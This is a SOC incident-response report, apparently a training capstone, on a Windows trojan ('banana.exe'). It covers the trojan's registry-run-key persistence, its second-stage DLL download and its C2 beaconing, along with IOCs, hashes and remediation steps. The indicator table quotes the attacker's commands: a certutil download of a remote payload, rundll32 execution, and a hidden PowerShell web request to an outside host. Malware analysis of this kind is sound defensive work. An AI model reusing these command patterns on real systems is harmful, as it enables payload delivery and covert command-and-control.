**Title: Malicious Process on Compromised Windows Endpoint**

**Name: James Jolley**

**Indicators and Technical Details**

| Datetime | Identifier (IP, Domain, URL, Hostname) | MITRE Technique ID | Analyst Comment |
| ----- | ----- | ----- | ----- |
| Jul 2, 2023 @ 16:42:45.588 | banana.exe | T1204.002 **User Execution: Malicious File** |  SHA-256: 177cc95750b51da9218013c3e8ddbb707e90eed74573349bfab7cc901666e135 Returned 34/70 from Virus total (**Analyst note:**  This is the initial PoC. The parent process for this was explorer.exe indicating this was started from the GUI.) |
| Jul 2, 2023 @ 16:42:46.049 | C:\\Windows\\System32\\tallyme.exe registry: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run name: “MrTallyMan”  | T1112 **Modify Registry** |  SHA-256: 3dd932a00cb3aadc242cf4ceb71a774fed039b557c34c22651d370fc6ba11190 (**Analyst note:** Registry keys created by banana.exe indicating persistence mechanism.)  |
| Jul 2, 2023 @ 16:42:46.063 | C:\\Windows\\system32\\cmd.exe /c certutil.exe \-URLcache \-f hxxps[://]ibarblkacoiwlkese[.]s3[.]amazonaws[.]com/update[.]dll c:\\Windows\\System32\\apple.dll | T1105 **Ingress Tool Transfer** | apple.dll SHA-256: 24564f1e1c5dece16ea0307fa9b03303fbbe300fbb785db22417f6c2e73c7a12 banana.exe spawned child process cmd.exe and called out to an amazon s3 bucket to download “update.dll” and save it as apple.dll |
| Jul 2, 2023 @ 16:42:46.796 | C:\\Windows\\system32\\cmd.exe /c rundll32.exe apple.dll,iliketoeat | T1218.011 **System Binary Proxy Execution: Rundll32** | banana.exe spawned a child process cmd.exe which executed rundll32.exe with the arguments apple.dll with the function iliketoeat. (**Analyst  note:** this iliketoeat function is likely what is triggering the network traffic with the apples\_and\_bananas flag set) |
| Jul 2, 2023 @ 16:42:51.912 | C:\\Windows\\system32\\cmd.exe /c powershell.exe \-Sta \-Nop \-Window Hidden \-c "Invoke-WebRequest \-UseBasicParsing \-Uri hxxps[://]tueoeoslxo[.]s3-us-west-2[.]amazonaws[.]com/index[.]html?flag=apples\_and\_bananas | T1059.001 **Command and Scripting Interpreter: PowerShell**  | cmd.exe spawning powershell.exe to begin web traffic. |
| Jul 2, 2023 @ 16:42:51.932 | powershell.exe  \-Sta \-Nop \-Window Hidden \-c "Invoke-WebRequest \-UseBasicParsing \-Uri hxxps[://]tueoeoslxo[.]s3-us-west-2[.]amazonaws[.]com/index[.]html?flag=apples\_and\_bananas" | TA0011 **Command and Control** | powershell.exe using invoke-webrequest to beacon to the c2 server. |

**Executive Summary**

On Jul 2, 2023 the SOC received an alert stating that there was a malicious process on one of our company computers. We investigated the alert and were able to confirm that one of our servers had been infected with malware. This malware was attempting to establish persistence on our system to begin running whenever the server was powered on, as well as restart itself if not killed in a specific way. We also noted that it had downloaded another malicious file as part of a second stage attack. This second file was communicating with an attacker  controlled server outside our network. We were able to isolate and remediate the infected system and did not note any attempts by the malware to compromise other devices on our network, and confirmed no confidential data was exfiltrated. We will continue to monitor for further signs of compromise, and have identified ways to prevent this from occurring in the future.

**Technical Summary**

On Jul 2, 2023 at 16:42 UTC The SOC received an AV alert stating that there was a malicious process on one of our hosts. Upon investigating we found a suspicious registry key in autoruns named “MrTallyMan” which had created a registry run key in the \\HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and was pointing to the path C:\\Windows\\System32\\tallyme.exe.  We then investigated the file by dumping the strings, and found it was associating with an amazon s3 bucket, calling out to download a file “update.dll” and saving it to the path C:\\Windows\\System32\\apple.dll, as well as calling rundll32.exe with apple.dll as an argument with the function “iliketoeat”. We retrieved the SHA256 hash and submitted it to virus total which returned no malicious indicators. We then moved on to inspecting running processes on the system and found a running process “banana.exe” which had spawned several child processes including rundll32.exe. Upon inspecting the dlls associated with this instance in process explorer we found mention of the apple.dll which allowed us to correlate this with the banana.exe process. We then dumped the strings from the apple.dll and found that it contained mention of another amazon s3 bucket as well as a flag being set to “apples\_and\_bananas”. We also submitted the hash to virus total and this too returned no malicious indicators. Since the associated rundll32.exe was repeatedly spawning and killing child processes we began capturing the network traffic in wireshark and found TLS 1.2 encrypted traffic going out to an address at  52\[.\]217.95.41, as well as DNS queries which returned the URL we found mentioned in the strings of the file. We then moved on to decrypt this traffic and found that it was repeatedly reaching out to hxxps[://]tueoeoslxo[.]s3-us-west-2[.]amazonaws[.]com/index[.]html?flag=apples\_and\_bananas and was receiving a response of 200 OK, indicating C2 beaconing. We then went back to the parent process banana.exe, and dumped the strings and found the same strings which were present in the tallyme.exe strings. This hash was submitted to Virus total which returned a score of 34/70 with alerts pointing to a generic trojan. Once we confirmed that this is a malicious infection we then captured the running process id, and began inspecting the interactions in our ELK siem. In ELK we were able to confirm the order of events that took place. We found the banana.exe was started from explorer.exe indicating this was started from the GUI. Once started it created the registry run keys for MrTallyMan, and then called out to the amazon s3 bucket to download the second stage payload apple.dll. It then spawned child processes of cmd.exe \> rundll32.exe \> cmd.exe \> powershell.exe which culminated in the process being injected to run the apple.dll and call out to the second s3 bucket and begin beaconing. We finally began remediation by deleting the registry run keys, killing the processes, and removing the files associated with this infection. Of note is the fact that only killing the banana.exe did not stop the other processes from running and we had to kill conhost.exe, and rundll32.exe to stop more child processes from spawning and halt the network traffic. We then restarted the system and monitored to confirm the infection was fully removed from the system.

**Findings and Analysis**

The SOC received an AV alert stating that there was a malicious process on a host. Upon investigating the host we observed MrTallyMan in autoruns, and a suspicious process running on the machine: banana.exe. The process had spawned several child processes (Figure 1\) including conhost.exe and cmd.exe. The cmd.exe process also had several child processes including rundll32.exe, which was continually respawning a child process cmd.exe and powershell.exe, which were starting and stopping at regular intervals.

*Figure 1 \- We see the suspicious process and child processes*

*![image1](https://github.com/jjolley91/Triage/blob/main/Mal_process_imgs/image1.png?raw=true)*

*Figure 1.1 \- bana.exe spawns conhost.exe and cmd.exe*

*Figure 1.2- child process cmd.exe spawns rundll32.exe, conhost.exe, and cmd.exe which spawns powershell.exe the latter two processes were observed starting, and stopping at regular intervals.*

We then killed the banana.exe process, at which point the rundll32.exe continued running. Upon killing the rundll32.exe we found that it restarted on its own, which indicated the presence of a persistence mechanism. The banana.exe SHA-256: 177cc95750b51da9218013c3e8ddbb707e90eed74573349bfab7cc901666e135 was submitted to Virus Total which returned a score of 34/70 with indicators pointing to a generic trojan.

We then inspected autoruns and a registry key in HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run with the name: “MrTallyMan” pointing to the path C:\\Windows\\System32\\tallyme.exe (Figure 2). We inspected the path and isolated the SHA-256: 3dd932a00cb3aadc242cf4ceb71a774fed039b557c34c22651d370fc6ba11190. We also dumped the strings for the file and found references to it calling “apple.dll” from C:\\Windows\\System32, as well as this calling the rundll32.exe with the argument apple.dll and the function iliketoeat (Figure 3).

*Figure 2- We observe A persistence mechanism which created registry run keys*

![image2](https://github.com/jjolley91/Triage/blob/main/Mal_process_imgs/image2.png?raw=true)

*Figure 2.1- Registry Hive location of the persistence*

*Figure 2.2- Name of the persistence mechanism “MrTallyMan”*

*Figure 2.3- pointing to the directory where the file is located.*

*Figure 3- Analysis of the strings contained in the tallyme.exe*

*![image3](https://github.com/jjolley91/Triage/blob/main/Mal_process_imgs/image3.png?raw=true)*

*Figure 3.1 \- we see the path to the tallyme.exe*

*Figure 3.2 \- we see reference to the registry location*

*Figure 3.3 \- we can see it reaching out to an S3 bucket to download “update.dll” and save it as apple.dll, then call rundll32.exe with apple.dll as the argument, and the function ‘iliketoeat’.*

We then located the apple.dll in the path C:\\Windows\\System32\\apple.dll and analyzed the strings (Figure 4). We Found it using Invoke-WebRequest to call out to hxxps[://]tueoeoslxo[.]s3-us-west-2[.]amazonaws[.]com/index[.]html with a flag set to “apples\_and\_bananas”. With this observed web traffic we then proceeded to capture the packets in wireshark and found them to be encrypted with TLS 1.2(Figure 4). This traffic was decrypted and found to be sending repeated GET requests to the url noted above which has the ip address 52\[.\]217.95.41 (Figure 5).

*Figure 4- inspecting the traffic in wireshark, we can see the DNS query and the tls handshake.*

*![image4](https://github.com/jjolley91/Triage/blob/main/Mal_process_imgs/image4.png?raw=true)

*Figure 5 \- Inspecting the decrypted traffic generated from the apple.dll*

![image5](https://github.com/jjolley91/Triage/blob/main/Mal_process_imgs/image5.png?raw=true)

*Figure 5.1- We see the repeated GET requests with the status code 200 OK*

*Figure 5.2- We see the GET request to /index.html with the flag ‘apples\_and\_bananas’*

*Figure 5.3- We see the server response with the message ‘OK’*

**Deeper Analysis:**

Now that we have Identified the obvious components of the banana.exe malware, we noted the running process ids on the infected server and continued the investigation on our ELK siem in order to gain a deeper understanding of the order of events that occurred. We found that the original banana.exe had been started from explorer.exe, confirming that this was started from a GUI (Figure 6).

*Figure 6- We see the process was started from the GUI, as well as the location where the malicious file was run.*

*![image6](https://github.com/jjolley91/Triage/blob/main/Mal_process_imgs/image6.png?raw=true)*

We next pivoted to see both when the registry keys were created and any child processes spawned by banana.exe. We found that it immediately spawned conhost.exe(Figure 7.1), create a registry run key named “MrTallyMan” pointing to tallyme.exe in the C:\\Windows\\System32 directory ( Figure 7.2), and reach out to an amazon s3 bucket to download a second stage payload update.dll and save it as apple.dll in the C:\\Windows\\System32 directory (Figure 7.3).

*Figure 7- We see the order in which banana.exe established persistence, and downloaded the second stage payload apple.dll*

*![image7](https://github.com/jjolley91/Triage/blob/main/Mal_process_imgs/image7.png?raw=true)*

*Figure 7.1- banana.exe spawns conhost.exe*

*Figure 7.2- banana.exe creates registry key named MrTallyMan pointing to C:\\windows\\system32\\tallyme.exe*

*Figure 7.3- banana.exe spawns cmd.exe which reaches out to the s3 bucket to download second stage payload apple.dll*

Next, banana.exe spawned another child process cmd.exe, which executed rundll32.exe with the argument apple.dll, and the function iliketoeat (Figure 8.1) indicating process injection. From there the rundll32.exe process was spawned and created another cmd.exe child process and another conhost.exe process.

*Figure 8- we see the rundll32 being spawned by cmd.exe and subsequently spawning another cmd.exe to execute the apple.dll.*

*![image8](https://github.com/jjolley91/Triage/blob/main/Mal_process_imgs/image1.png?raw=true)*

*Figure 8.1- We see banana spawn cmd.exe with the rundll32.exe and the apple.dll argument calling the iliketoeat function.*

*Figure 8.2- We see cmd.exe spawn the rundll32.exe* 

*Figure 8.3- we see rundll32.exe spawn conhost.exe as well as cmd.exe, where the network traffic begins.*

**Remediation and Recommendations**

Remove the associated files from the system:

	C:\\Windows\\System32\\tallyme.exe

	C:\\Windows\\System32\\apple.dll

	C:\\Users\\Administrator\\Desktop\\Capstones\\Malicious Process\\Malicious\_Process\\banana.exe

	C:\\Users\\Administrator\\Downloads\\banana.exe

Remove Registry run keys:

	 HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run MrTallyMan

Block URLs associated with this infection:

	hxxps[://]ibarblkacoiwlkese[.]s3[.]amazonaws[.]com

	hxxps[://]tueoeoslxo[.]s3-us-west-2[.]amazonaws[.]com 

Restart the system to verify the persistence is removed and monitor for further signs of infection.

If you are unsure the remediation was successful, reimage the machine and continue to monitor.

**YARA RULE:** 

RULE: Casing\_Anomaly\_Certutil\_Urlcache

RULE\_SET: Livehunt \- Suspicious5 Indicators 

RULE\_TYPE: VALHALLA rule feed only 

RULE\_LINK: https://valhalla.nextron-systems.com/info/rule/Casing\_Anomaly\_Certutil\_Urlcache

DESCRIPTION: Detects suspicious casing in commands

REFERENCE: https://github.com/api0cradle/LOLBAS/tree/master/OSBinaries

RULE\_AUTHOR: Florian Roth

Credit: thor 

**References**

[https://www.virustotal.com/gui/file/177cc95750b51da9218013c3e8ddbb707e90eed74573349bfab7cc901666e135/community](https://www.virustotal.com/gui/file/177cc95750b51da9218013c3e8ddbb707e90eed74573349bfab7cc901666e135/community) 
